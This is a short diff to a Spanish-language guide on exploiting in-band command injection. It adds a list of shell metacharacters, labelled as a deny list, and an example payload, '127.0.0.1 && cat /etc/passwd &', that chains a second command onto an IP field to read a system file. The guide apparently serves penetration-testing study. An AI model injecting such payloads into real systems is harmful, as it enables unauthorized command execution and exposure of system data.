@@ -6,7 +6,7 @@ Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a expl
 
 ### 💥 `In-Band CMDI: exploitation`
 
-1. Utilizar `shell metacharacters`
+1. Utilizar `shell metacharacters` como payload inicial:
 
 ````py
 ## General deny list to be included for command injection:
@@ -19,6 +19,15 @@ Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a expl
 { } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . " %  / \ : + , `
 
 ````
+
+2. **Concatenar** comandos:
+
+````py
+## Concatena 127.0.0.1 + cat /etc/passwd + (concatena lo que sigue en el comando original con un &)
+127.0.0.1 && cat /etc/passwd &
+
+````
+
 
 
 
